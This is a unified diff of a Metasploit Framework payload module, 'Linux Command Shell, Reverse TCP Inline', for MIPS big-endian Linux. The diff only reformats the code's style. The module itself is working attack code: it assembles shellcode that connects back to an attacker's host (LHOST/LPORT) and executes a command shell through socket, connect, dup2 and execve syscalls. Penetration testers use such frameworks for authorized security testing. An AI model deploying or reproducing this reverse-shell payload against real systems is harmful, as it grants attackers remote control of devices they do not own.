@@ -3,50 +3,48 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
 module MetasploitModule
-
   CachedSize = 184
 
   include Msf::Payload::Single
   include Msf::Sessions::CommandShellOptions
 
   def initialize(info = {})
-    super(merge_info(info,
-      'Name'          => 'Linux Command Shell, Reverse TCP Inline',
-      'Description'   => 'Connect back to attacker and spawn a command shell',
-      'Author'        =>
-        [
+    super(
+      merge_info(
+        info,
+        'Name' => 'Linux Command Shell, Reverse TCP Inline',
+        'Description' => 'Connect back to attacker and spawn a command shell',
+        'Author' => [
           'rigan <imrigan[at]gmail.com>', # Original shellcode
           'juan vazquez' # Metasploit module
         ],
-      'References'    =>
-        [
+        'References' => [
           ['EDB', '18226']
         ],
-      'License'       => MSF_LICENSE,
-      'Platform'      => 'linux',
-      'Arch'          => ARCH_MIPSBE,
-      'Handler'       => Msf::Handler::ReverseTcp,
-      'Session'       => Msf::Sessions::CommandShellUnix,
-      'Payload'       =>
-        {
-          'Offsets' => { },
+        'License' => MSF_LICENSE,
+        'Platform' => 'linux',
+        'Arch' => ARCH_MIPSBE,
+        'Handler' => Msf::Handler::ReverseTcp,
+        'Session' => Msf::Sessions::CommandShellUnix,
+        'Payload' => {
+          'Offsets' => {},
           'Payload' => ''
-        })
+        }
+      )
     )
   end
 
   def generate(_opts = {})
-    if( !datastore['LHOST'] or datastore['LHOST'].empty? )
+    if !datastore['LHOST'] || datastore['LHOST'].empty?
       return super
     end
 
     host = Rex::Socket.addr_atoi(datastore['LHOST'])
     port = Integer(datastore['LPORT'])
 
-    host = [host].pack("N").unpack("cccc")
-    port = [port].pack("n").unpack("cc")
+    host = [host].pack('N').unpack('cccc')
+    port = [port].pack('n').unpack('cc')
 
     shellcode =
       # sys_socket
@@ -70,11 +68,11 @@ module MetasploitModule
       "\x34\x0f\xff\xfd" + # li t7,0xfffd
       "\x01\xe0\x78\x27" + # nor t7,t7,zero
       "\xaf\xaf\xff\xe0" + # sw t7,-32(sp)
-      "\x3c\x0e" + port.pack("C2") + # lui t6,0x1f90
-      "\x35\xce" + port.pack("C2") + # ori t6,t6,0x1f90
+      "\x3c\x0e" + port.pack('C2') + # lui t6,0x1f90
+      "\x35\xce" + port.pack('C2') + # ori t6,t6,0x1f90
       "\xaf\xae\xff\xe4" + # sw t6,-28(sp)
-      "\x3c\x0e" + host[0..1].pack("C2") + # lui t6,0x7f01
-      "\x35\xce" + host[2..3].pack("C2") + # ori t6,t6,0x101
+      "\x3c\x0e" + host[0..1].pack('C2') + # lui t6,0x7f01
+      "\x35\xce" + host[2..3].pack('C2') + # ori t6,t6,0x101
       "\xaf\xae\xff\xe6" + # sw t6,-26(sp)
       "\x27\xa5\xff\xe2" + # addiu a1,sp,-30
       "\x24\x0c\xff\xef" + # li t4,-17
@@ -112,7 +110,7 @@ module MetasploitModule
       "\xaf\xa0\xff\xfc" + # sw zero,-4(sp)
       "\x27\xa5\xff\xf8" + # addiu a1,sp,-8
       "\x24\x02\x0f\xab" + # li v0,4011 # sys_execve
-      "\x01\x01\x01\x0c"  # syscall 0x40404
+      "\x01\x01\x01\x0c" # syscall 0x40404
 
     return super + shellcode
   end
